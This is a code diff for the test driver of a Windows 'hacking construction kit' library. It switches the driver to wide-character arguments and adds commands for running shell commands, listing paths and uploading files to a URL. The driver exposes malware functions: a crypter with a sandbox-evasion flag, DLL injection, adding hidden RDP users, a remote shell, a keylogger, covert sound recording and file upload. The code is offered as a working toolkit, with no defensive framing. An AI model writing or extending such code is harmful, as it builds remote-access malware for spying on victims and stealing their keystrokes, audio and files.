@@ -19,7 +19,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
 #include <Winuser.h>
-#include <tchar.h>
 
 #include <keylogger.h>
 #include <cprocess.h>
@@ -35,14 +34,16 @@
 #include <extern\RSA.h>
 #include <sound_recorder.h>
 #pragma comment(lib, "hacking construction kit.lib")
-#pragma comment(lib, "zlibstat.lib")
 
 #include <memory_debug.h>
 
 using namespace std;
 
-int main(int argc, _TCHAR* argv[])
+int wmain(int argc, wchar_t* argv[])
 {
+#ifdef _DEBUG
+	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
+#endif
 	if (argc == 1){
 		printf("Test hck library\n");
 		printf("Encode base 64: a value\n");
@@ -51,7 +52,7 @@ int main(int argc, _TCHAR* argv[])
 		printf("Find open TCP port: d port\n");
 		printf("Kill a process: e pid\n");
 		printf("Inject dll: f path pid\n");
-		printf("Inject dll with LoadLibrary: g path pid\n");
+		printf("Inject dll with LoadLibrary: g FULLpath pid\n");
 		printf("Add a RDP user: h username password\n");
 		printf("Remove RDP user: i username\n");
 		printf("Open a remote shell: j port\n");
@@ -65,161 +66,202 @@ int main(int argc, _TCHAR* argv[])
 		printf("Start key logger: r filename\n");
 		printf("Generate RSA keys: s digits\n");
 		printf("Sound record: t filename time\n");
+		printf("Execute a shell command: u cmd waitForResult\n");
+		printf("list a path: v path\n");
+		printf("upload a file: w file url\n");
 
 		return 0;
 	}
-	_TCHAR firstParam = *argv[1];
+	wchar_t firstParam = *argv[1];
 	if (firstParam == 'a'){
-		unsigned char *value = (unsigned char*)argv[2];
+		wchar_t *value = argv[2];
 		// Encode b64
 		Base64 b64;
 		size_t output;
-		char * encoded = b64.encode(value, strlen((char *)value), &output);
+		char * encoded = b64.encode((unsigned char *)value, wcslen(value) * sizeof(wchar_t), &output);
 
 		char *buffer = new char[output + 1];
 		buffer[output] = '\0';
 		_snprintf(buffer, output, "%s", encoded);
 
 		printf(buffer);
+
+		delete buffer;
+		delete encoded;
 
 	} else if (firstParam == 'b'){
 		// Decode b64
-		char *value = argv[2];
+		wchar_t *value = argv[2];
 		// Encode b64
 		Base64 b64;
 		size_t output;
-		unsigned char * encoded = b64.decode(value, strlen((char *)value), &output);
+		wchar_t * encoded = (wchar_t*)b64.decode(value, wcslen(value) * sizeof(wchar_t), &output);
 
-		char *buffer = new char[output + 1];
-		buffer[output] = '\0';
-		_snprintf(buffer, output, "%s", encoded);
+		wchar_t *buffer = new wchar_t[output / sizeof(wchar_t) + 1];
+		buffer[output / sizeof(wchar_t)] = '\0';
+		_snwprintf(buffer, output / sizeof(wchar_t), L"%s", encoded);
 
-		printf(buffer);
+		std::wcout << buffer;
+
+		delete buffer;
+		delete encoded;
 	} else if (firstParam == 'c'){
 		// Crypter
-		char *infile = argv[2];
-		char *outfile = argv[3];
+		wchar_t *infile = argv[2];
+		wchar_t *outfile = argv[3];
 		Crypter::evadeSandbox = false;
 		Crypter::crypt(infile, outfile);
 	} else if (firstParam == 'd'){
 		// Find open port
-		char *port = argv[2];
+		wchar_t *port = argv[2];
 		char ip[20];
-		if (Check::findHostPortOpen(ip, atoi(port))){
+		if (Check::findHostPortOpen(ip, _wtoi(port))){
 			printf("Found a port open on %s\n", ip);
 		}
 	} else if (firstParam == 'e'){
 		// Kill process
-		char *pid = argv[2];
-		if (Process::killProcess(atoi(pid))){
+		wchar_t *pid = argv[2];
+		if (Process::killProcess(_wtoi(pid))){
 			printf("Process killed\n");
+		} else {
+			printf("Unable to kill process\n");
 		}
 	} else if (firstParam == 'f'){
 		// Inject dll
-		char *path = argv[2];
-		char *pid = argv[3];
-		if (Process::injectDll(path, atoi(pid))){
+		wchar_t *path = argv[2];
+		wchar_t *pid = argv[3];
+		if (Process::injectDll(path, _wtoi(pid))){
 			printf("Injection ok\n");
 		}
 	} else if (firstParam == 'g'){
 		// Inject dll with LoadLibrary
-		char *path = argv[2];
-		char *pid = argv[3];
-		if (Process::injectDllWithLoadLibrary(path, atoi(pid))){
+		wchar_t *path = argv[2];
+		wchar_t *pid = argv[3];
+		if (Process::injectDllWithLoadLibrary(path, _wtoi(pid))){
 			printf("Injection ok\n");
 		}
 	} else if (firstParam == 'h'){
 		// Add rdp user
-		char *username = argv[2];
-		char *password = argv[3];
+		wchar_t *username = argv[2];
+		wchar_t *password = argv[3];
 		Shell::addRdpUser(username, password);
 	} else if (firstParam == 'i'){
 		// Remove rdp user
-		char *username = argv[2];
+		wchar_t *username = argv[2];
 		Shell::removeRdpUser(username);
 	} else if (firstParam == 'j'){
 		// Open shell
-		char *port = argv[2];
-		Shell::openShell(atoi(port));
+		wchar_t *port = argv[2];
+		Shell::openShell(_wtoi(port));
 		Sleep(INFINITE);
 	} else if (firstParam == 'k'){
 		// Find files
-		char *path = argv[2];
-		char *filename = argv[3];
-		vector<string> files;
+		wchar_t *path = argv[2];
+		wchar_t *filename = argv[3];
+		vector<tstring> files;
 		DWORD totalSize = 0;
 
 		if (File::findFile(files, path, filename, totalSize)){
-			for (vector<string>::iterator it = files.begin() ; it != files.end(); ++it){
-				std::cout << *it << std::endl;
+			for (vector<tstring>::iterator it = files.begin() ; it != files.end(); ++it){
+				std::wcout << *it << std::endl;
 			}
 		}
 	} else if (firstParam == 'l'){
 		// Replace in a file
-		char *infile = argv[2];
-		char *outfile = argv[3];
-		char *searched = argv[4];
-		char *size = argv[5];
-		char *replace = argv[6];
-		if (File::replaceInFile(infile, outfile, searched, atoi(size), replace)){
+		wchar_t *infile = argv[2];
+		wchar_t *outfile = argv[3];
+		char *searched = wToc(argv[4]);
+		wchar_t *size = argv[5];
+		char *replace = wToc(argv[6]);
+		if (File::replaceInFile(infile, outfile, searched, _wtoi(size), replace)){
 			printf("String replaced\n");
 		}
+		delete[] searched;
+		delete[] replace;
 
 	} else if (firstParam == 'm'){
 		// Send GET
-		char *uri = argv[2];
+		wchar_t *uri = argv[2];
+		std::wcout << uri;
 		HttpHelper helper;
-		LPSTR *response = helper.get(uri);
+		LPSTR *responses = helper.get(uri);
+		LPSTR *response = responses;
 		while(*response != 0){
 			printf("%s", *response);
+			delete[] *response;
 			response++;
 		}
+		delete[] responses;
 	} else if (firstParam == 'n'){
 		// Send POST
-		char *server = argv[2];
-		char *uri = argv[3];
-		char *post = argv[4];
+		wchar_t *server = argv[2];
+		wchar_t *uri = argv[3];
+		wchar_t *post = argv[4];
 		char *response;
 		int size;
 		HttpHelper helper;
 		if (helper.sendPost(server, uri, post, &response, size)){
-			Print::printBuffer(response, size);
+			//Print::printBuffer(response, size);
+			delete response;
 		}
-
 	} else if (firstParam == 'o'){
 		// Download
-		char *uri = argv[2];
-		char *filename = argv[3];
+		wchar_t *uri = argv[2];
+		wchar_t *filename = argv[3];
 		HttpHelper helper;
 		helper.download(uri, filename);
 	} else if (firstParam == 'p'){
 		// Ping
-		char *ip = argv[2];
+		char *ip = wToc(argv[2]);
 		if (Icmp::ping(ip)){
 			printf("Ping %s ok\n", ip);
 		}
+		delete[] ip;
 	} else if (firstParam == 'q'){
 		// Get all infos
-		std::cout << Info::getAllInfos();
+		std::wcout << Info::getAllInfos();
 	} else if (firstParam == 'r'){
 		// Start key logger
-		char *filename = argv[2];
+		wchar_t *filename = argv[2];
 		Keylogger::startKeylogger(filename);
 		Sleep(INFINITE);
 	} else if (firstParam == 's'){
 		// Generate RSA key pairs
-		char *digits = argv[2];
-		KeyPair pair = RSA::GenerateKeyPair(atoi(digits));
+		wchar_t *digits = argv[2];
+		KeyPair pair = RSA::GenerateKeyPair(_wtoi(digits));
 		std::cout << pair << std::endl;
 	} else if (firstParam == 't'){
 		SoundRecorder sound;
-		char *filename = argv[2];
-		char *time = argv[3];
-		if (sound.record(atoi(time), filename)){
+		wchar_t *filename = argv[2];
+		wchar_t *time = argv[3];
+		// TODO: check
+		if (sound.record(_wtoi(time), filename)){
 			printf("Sound recorded ok\n");
 		}
+	} else if (firstParam == 'u'){
+		wchar_t *cmd = argv[2];
+		wchar_t *wait = argv[3];
+		Shell::executeCmd(cmd, _wtoi(wait) == 0 ? false: true);
+
+	} else if (firstParam == 'v'){
+		wchar_t *path = argv[2];
+		vector<tstring> files;
+		vector<tstring> folders;
+		File::listDirectory(path, files, folders);
+		for (vector<tstring>::iterator it = files.begin() ; it != files.end(); ++it){
+			std::wcout << *it << endl;
+		}
+		for (vector<tstring>::iterator it = folders.begin() ; it != folders.end(); ++it){
+			std::wcout << *it << endl;
+		}
+	} else if (firstParam == 'w'){
+		HttpHelper http;
+		char *response;
+		int size;
+		http.uploadFile(argv[3], argv[2], L"upload", &response, size);
 	} else {
 		printf("Params not recognised\n");
 	}
-
+	//_CrtDumpMemoryLeaks();
+	return 0;
 }
